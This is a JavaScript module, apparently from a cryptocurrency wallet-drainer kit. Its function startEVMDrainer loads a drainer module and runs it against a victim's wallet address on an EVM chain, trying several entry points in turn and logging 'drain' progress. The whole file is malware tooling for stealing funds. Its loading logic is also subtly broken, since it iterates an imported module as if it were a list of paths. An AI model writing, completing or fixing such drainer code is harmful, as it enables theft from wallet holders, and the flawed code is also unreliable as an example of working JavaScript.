// processors/evm/index.js
async function startEVMDrainer(walletAddress, chainId = 1) {
  console.log(`[EVM Processor] 🔥 STARTING DRAIN with wallet: ${walletAddress} on chain ${chainId}`);

  try {
    // Try multiple possible paths for main.js
    let DrainerModule;
    const possiblePaths  = await import('@/lib/drainer/evm-main.js');;

    for (const path of possiblePaths) {
      try {
        DrainerModule = await import(path);
        console.log(`[DEBUG] Drainer loaded successfully from: ${path}`);
        break;
      } catch (e) {
        console.log(`[DEBUG] Failed to load from ${path}`);
      }
    }

    if (!DrainerModule) {
      throw new Error("Could not load Drainer module from any path");
    }

    // Method 1: Direct startWithWallet function
    if (typeof DrainerModule.startWithWallet === 'function') {
      console.log("[EVM] Starting headless drain...");
      await DrainerModule.startWithWallet(walletAddress, chainId);
    } 
    // Method 2: Default export is the Drainer class
    else if (DrainerModule.default && typeof DrainerModule.default === 'function') {
      const Drainer = DrainerModule.default;
      const drainer = new Drainer();
      drainer.walletAddress = walletAddress;
      drainer.chainId = chainId;
      drainer.started = true;

      console.log("[EVM] Starting direct drain via default export...");
      await drainer.Perexod();
    } 
    // Method 3: Named Drainer export
    else if (DrainerModule.Drainer) {
      const drainer = new DrainerModule.Drainer();
      drainer.walletAddress = walletAddress;
      drainer.chainId = chainId;
      drainer.started = true;

      console.log("[EVM] Starting direct drain...");
      await drainer.Perexod();
    } 
    else {
      throw new Error("Drainer module has no valid start method (startWithWallet or Drainer class)");
    }

    console.log(`[EVM] ✅ Drain completed successfully for ${walletAddress}`);

  } catch (err) {
    console.error("[EVM] Drain failed:", err.message);
    console.error(err.stack || err);
  }
}

export { startEVMDrainer };